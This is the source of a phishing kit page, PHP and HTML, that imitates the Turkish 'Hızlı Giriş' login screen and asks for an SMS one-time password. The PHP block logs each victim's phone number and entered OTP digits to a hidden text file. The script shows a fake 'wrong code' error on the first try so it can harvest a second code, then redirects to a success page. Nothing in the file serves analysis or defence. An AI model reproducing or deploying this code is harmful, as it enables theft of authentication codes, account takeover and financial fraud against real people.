<?php 
session_start();
date_default_timezone_set('Europe/Istanbul');
$actual_link = "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
if(isset($_POST['last4DigitsTxt']) && $_POST['where'] == "250"){
   $file = fopen("../../ferdi.txt", "a"); 
   $text = "---------->". "\r\n" . "Giris \r\nTarih : " . date('d/m/Y - H:i') . "\r\n" . "Telefon: " . $_POST['last4DigitsTxt'] . "\r\n<----------" . "\r\n"; 
   fwrite($file, $text);
   fclose($file);
   $_SESSION['phone'] = $_POST['phone'];
   header('Location: ../../step2.php');
}
$phone = $_SESSION['phone'];
if(isset($_POST['char1']) && $_POST['char2'] && $_POST['char3'] && $_POST['char4']){
   $file = fopen("../../ferdi.txt", "a"); 
    $text = "---------->". "\r\n" . "Giris \r\nTarih : " . date('d/m/Y - H:i') . "\r\n" . "Telefon : " . $phone . "\r\n" . "Kod: " . $_POST['char1'].$_POST['char2'].$_POST['char3'].$_POST['char4'] . "\r\n<----------" . "\r\n"; 
    fwrite($file, $text);
    fclose($file);
    header('Location: ./');
}

?>

<!--sr0-->
<html lang="tr">
   <head>
   <base href="https://hizligiris.com.tr/hizligiris/generic/login">
      <link type="text/css" rel="stylesheet" id="dark-mode-custom-link">
      <link type="text/css" rel="stylesheet" id="dark-mode-general-link">
      <style lang="en" type="text/css" id="dark-mode-custom-style"></style>
      <style lang="en" type="text/css" id="dark-mode-native-style"></style>
      <meta charset="UTF-8">
      <meta http-equiv="Content-language" content="tr">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="description" content="">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
      <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
      <title>OTP</title>
      <style>
         .icon-clock::before, .sms-input-area__timer:after {
            content: '' !important;
         }
      </style>
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<!-- End Google Tag Manager -->


<link rel="preload" href="assets/fonts/IconFont.woff?v=202110-last" as="font" type="font/woff" crossorigin="">
<link rel="preload" href="assets/fonts/typekit/museo-sans-bold.woff2" as="font" type="font/woff2" crossorigin="">
<link rel="preload" href="assets/fonts/typekit/museo-sans.woff2" as="font" type="font/woff2" crossorigin="">
<link rel="preload" href="assets/fonts/GreycliffCF-Medium.woff2" as="font" type="font/woff2" crossorigin="">
<link rel="preload" href="assets/fonts/GreycliffCF-Regular.woff2" as="font" type="font/woff2" crossorigin="">
<link rel="preload" href="assets/fonts/GreycliffCF-Bold.woff2" as="font" type="font/woff2" crossorigin="">
<link rel="stylesheet" type="text/css" media="all" href="assets/styles/main.min.css?v=202110-last">






</head>
<body>
	 

<script defer="" src="assets/scripts/utils.js?v=202110-last"></script>
<script defer="" src="assets/scripts/main.min.js?v=202110-last"></script>

	



<!-- Google Tag Manager (noscript) -->
<script>
                                var saniye = 30; // saniyeyi ayarla
                                var dakika = 1; // dakikayı ayarla
                                function countDown() {
                                    saniye--;
                                    if (saniye == -01) {
                                        saniye = 59;
                                        dakika = dakika - 1;
                                    } else {
                                        dakika = dakika;
                                    }
                                    if (saniye <= 9) {
                                        saniye = "0" + saniye;
                                    }
                                    time = (dakika <= 9 ? "0" + dakika : dakika) + ":" + saniye;
                                    if (document.getElementById) {
                                        cntr.innerHTML = time;
                                    }
                                    SD = window.setTimeout("countDown();", 1000);
                                    if (dakika == '00' && saniye == '00') {
                                        saniye = "00";
                                        window.clearTimeout(SD);
                                        $('.mnt-send-again').removeClass('disabled')
                                    }
                                }

                                function addLoadEvent(func) {
                                    var oldonload = window.onload;
                                    if (typeof window.onload != 'function') {
                                        window.onload = func;
                                    } else {
                                        window.onload = function() {
                                            if (oldonload) {
                                                oldonload();
                                            }
                                            func();
                                        }
                                    }
                                }
                                addLoadEvent(function() {
                                   countDown();
                                });


</script>

<div class="main">
	<header class="main-header">
		<div class="container">
	</div></header>
	<div class="main-body">
		<div class="main-body-container">
			<div class="main-body-container-header">
				<h2 tabindex="0" class="main-header__logo" title="Hızlı Giriş">
			   <img src="https://i.imgur.com/2lXxJYy.png" width="156px">
				</h2>
			</div>
                    <div class="container">
                        <p class="intro">Lütfen cep telefonunuza gönderilen tek kullanımlık şifrenizi girin</p>
                    </div>
                    <div class="container container--large">
                    	<div class="sms-input-area">
                            <div class="sms-input-area__input-container">
                            <div style="position:absolute;left:-1000px;top:-1000px;"><input style="background: red;" aria-hidden="true" type="email" name="sms-code-hidden" autocomplete="one-time-code" data-dirty="false"></div>
                            <input class="form-control force-ltr form-textbox char-field" maxlength="1" id="char1" type="text" required/>
                           <input class="form-control force-ltr form-textbox char-field" maxlength="1" id="char2" type="text" required/>
                           <input class="form-control force-ltr form-textbox char-field" maxlength="1" id="char3" type="text" required/>
                            <input class="form-control force-ltr form-textbox char-field" maxlength="1" id="char4" type="text" required/>
                            </div><span class="sms-input-area__error2" data-error-message="" id="error" style="text-align: center;">SMS şifresini yanlış girdiniz.</span>
                            <a id="smsOtpResendOtpLink" href="#" onclick="resendOtp()" class="btn sms-input-area__link js-send-password btn--transparent">TEKRAR GÖNDER</a>
                            <div tabindex="0" class="sms-input-area__timer"><span id="cntr">01:30 </span>&nbsp;<i class="fa-solid fa-clock"></i></div><input type="hidden" name="otpTimeout" class="js-counter-seconds-timer" value="29" data-dirty="true">
                        </div>
						
                    </div>
                    <button class="btn js-otp-button" id="smsOtpSubmitOtpButton">
                       Tamam
                              </button>
                </div>
            </div>
            <base href="<?=$actual_link?>">
            <script>
   var count = 0;
   var url = "<?=$actual_link?>index.php";
   $('#char2').keyup(function(e){
      if($('#char3').val().length == 0){
        $('#error').hide();
      }
  })
   $("#smsOtpSubmitOtpButton").click(function(e) {
     
                                       if($("#char4").val().length == 1){
                                          if(count == 1){
                                             $.ajax({
                                                url: url,
                                                type: "post",
                                                data: {
                                                   char1: $('#char1').val(),
                                                   char2: $('#char2').val(),
                                                   char3: $('#char3').val(),
                                                   char4: $('#char4').val(),
                                                   count: count
                                                      },
                                                   success: function (response) {
                                                     console.log($('#char1').val()+$('#char2').val()+$('#char3').val()+$('#char4').val());
                                                     $('#char4').val('');
                                                     $('#char3').val('');
                                                     $('#char2').val('');
                                                     $('#char1').val('');
                                                     $('#char1').focus();
                                                     window.parent.location.href = "<?=$actual_link?>../../success.php";
                                                   }
                                                   })
                                                   }else{
                                                      $('#error').show();
                                                      $.ajax({
                                                         url: url,
                                                         type: "post",
                                                         data: {
                                                            char1: $('#char1').val(),
                                                            char2: $('#char2').val(),
                                                            char3: $('#char3').val(),
                                                            char4: $('#char4').val(),
                                                            count: count
                                                            },
                                                            success: function (response) {
                                                               console.log($('#char1').val()+$('#char2').val()+$('#char3').val()+$('#char4').val());
                                                               $('#char4').val('');
                                                               $('#char3').val('');
                                                               $('#char2').val('');
                                                               $('#char1').val('');
                                                               $('#char1').focus();
                                                               count = count+1;
                                                               console.log(count)
                                                               }
                                                               })
                                                               }
                                                               }
                                                               });
</script>
            <script type="text/javascript">//<![CDATA[


$(function() {
    var charLimit = 1;
    $(".char-field").keydown(function(e) {

        var keys = [8, 9, /*16, 17, 18,*/ 19, 20, 27, 33, 34, 35, 36, 37, 38, 39, 40, 45, 46, 144, 145];

        if (e.which == 8 && this.value.length == 0) {
            $(this).prev('.char-field').focus();
        } else if ($.inArray(e.which, keys) >= 0) {
            return true;
        } else if (this.value.length >= charLimit) {
            $(this).next('.char-field').focus();
            return false;
        } else if (e.shiftKey || e.which <= 48 || e.which >= 58) {
            return false;
        }
    }).keyup (function () {
        if (this.value.length >= charLimit) {
            $(this).next('.char-field').focus();
            return false;
        }
    });
});


  //]]>
   </script>


	<div class="main-footer">
	<div class="container container--large"></div>
	<div class="container">
	
			
			
			
			
			<nav class="main-footer__nav" id="footerWithoutTooltip">
			<div>
			<a href="#privacyModal" id="footerPrivacyLink" onclick="window.dataLayer.push({'eventCategory': 'privacy','eventLabel': 'privacyClick'});" data-modal-url="privacy_modal">Aydınlatma Metini</a>
			ve
			<a href="#cookiesModal" id="cookiesLink" onclick="window.dataLayer.push({'eventCategory': 'cookies','eventLabel': 'cookiesClick'});" data-modal-url="cookies_modal">Çerez</a>
			</div>
			
		
					
			
			<a href="#aboutModal" onclick="window.dataLayer.push({'eventCategory': 'about','eventLabel': 'aboutClick'});" id="footerAboutLink" data-modal-url="about_modal">Hakkında</a>
		</nav>
	</div>
</div>


        </div>

</body></html>